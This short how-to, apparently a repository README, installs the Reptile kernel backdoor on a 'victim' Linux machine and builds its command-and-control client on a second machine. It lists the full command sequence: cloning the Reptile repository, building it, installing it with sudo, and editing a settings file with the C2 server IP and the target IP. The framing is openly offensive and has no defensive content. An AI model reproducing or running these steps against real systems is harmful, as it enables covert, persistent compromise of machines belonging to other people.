Follow my screenshots to install the reptile backdoor on the victim.

Essentially it is :

#### Victim machine

# Did this on my ubuntu14.04 machine

sudo apt install git libreadline-dev build-essential libncurses-dev linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
make menuconfig
#accept all the default options (Select Exit)
make
sudo make install


#### Control machine

# Did this on some other focal server machine

Essentially the same as above, but:

sudo apt install git libreadline-dev build-essential libncurses-dev linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
make client

Then run the client and `load settings.txt` (also in this repo)
Should not any any new lines to settings file, only change the first ip to ip of your cc server and the other 144ip to the address of the one you are hacking.
